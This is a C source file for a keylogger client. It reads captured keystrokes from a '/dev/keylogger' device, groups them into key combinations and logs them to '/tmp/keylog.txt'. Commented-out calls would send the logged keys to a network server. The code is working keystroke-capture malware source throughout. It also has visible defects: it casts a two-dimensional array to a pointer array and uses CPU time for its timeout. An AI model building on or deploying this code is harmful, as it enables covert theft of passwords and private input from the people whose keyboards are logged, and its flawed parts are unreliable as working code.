#include <stdio.h>
#include <signal.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include "device_client.h"
#include "logger.h"
#include "network_client.h"
#include "keymap.h"

#define MAX_KEYS 10
#define MAX_KEY_LEN 32

static volatile bool running = true;
static char key_buffer[MAX_KEYS][MAX_KEY_LEN];
static int key_count = 0;
static unsigned long last_key_time = 0;
#define KEY_TIMEOUT 1000  // 1 second timeout for key combinations

void handle_sigint(int sig) {
    (void)sig;
    running = false;
    printf("\nExiting program...\n");
}

void process_key_combination(void) {
    if (key_count > 0) {
        const char *action = interpret_key_combo((const char **)key_buffer, key_count);
        if (action) {
            char output[256];
            snprintf(output, sizeof(output), "Action: %s (from keys: ", action);
            for (int i = 0; i < key_count; i++) {
                strncat(output, key_buffer[i], sizeof(output) - strlen(output) - 1);
                if (i < key_count - 1) {
                    strncat(output, "+", sizeof(output) - strlen(output) - 1);
                }
            }
            strncat(output, ")\n", sizeof(output) - strlen(output) - 1);
            logger_write(output);
            
            // Send to network server
            // if (network_client_send(output, strlen(output)) < 0) {
            //     fprintf(stderr, "Failed to send action to server\n");
            // }
        } else {
            // If no interpretation available, log the raw keys
            char output[256] = "Keys: ";
            for (int i = 0; i < key_count; i++) {
                strncat(output, key_buffer[i], sizeof(output) - strlen(output) - 1);
                if (i < key_count - 1) {
                    strncat(output, "+", sizeof(output) - strlen(output) - 1);
                }
            }
            strncat(output, "\n", sizeof(output) - strlen(output) - 1);
            logger_write(output);
            
            // Send to network server
            // if (network_client_send(output, strlen(output)) < 0) {
            //     fprintf(stderr, "Failed to send keys to server\n");
            // }
        }
        key_count = 0;  // Reset for next combination
    }
}

int main(void) {
    char buf[1024];
    unsigned long current_time;

    signal(SIGINT, handle_sigint);

    // Initialize network client
    // if (network_client_init("config.env") < 0) {
    //     if (network_client_init("user/config.env") < 0) {
    //         fprintf(stderr, "Failed to initialize network client\n");
    //         return 1;
    //     }
    // }

    // Initialize device client
    if (device_client_init("/dev/keylogger") < 0) {
        fprintf(stderr, "Failed to initialize device client\n");
        // network_client_cleanup();
        return 1;
    }

    if (logger_open("/tmp/keylog.txt") < 0) {
        fprintf(stderr, "Failed to open log file\n");
        device_client_cleanup();
        // network_client_cleanup();
        return 1;
    }

    printf("Keylogger started. Reading from /dev/keylogger\n");

    while (running) {
        int len = device_client_read(buf, sizeof(buf));
        if (len > 0) {
            buf[len] = '\0';  // Ensure null termination
            
            // Get current time in milliseconds
            current_time = (unsigned long)(clock() * 1000 / CLOCKS_PER_SEC);
            
            // Check if we need to process the current combination due to timeout
            if (key_count > 0 && (current_time - last_key_time) > KEY_TIMEOUT) {
                process_key_combination();
            }
            
            // Add the new key to the buffer
            if (key_count < MAX_KEYS) {
                strncpy(key_buffer[key_count], buf, MAX_KEY_LEN - 1);
                key_buffer[key_count][MAX_KEY_LEN - 1] = '\0';
                key_count++;
                last_key_time = current_time;
                
                // If we have a complete combination, process it
                if (key_count >= MAX_KEYS) {
                    process_key_combination();
                }
            }
            
            printf("Received: %s\n", buf);
            fflush(stdout);
        } else if (len == 0) {
            // No data available, sleep a bit
            usleep(10000);  // 10ms
        }
    }

    // Process any remaining keys
    process_key_combination();
    
    logger_close();
    device_client_cleanup();
    // network_client_cleanup();
    return 0;
} 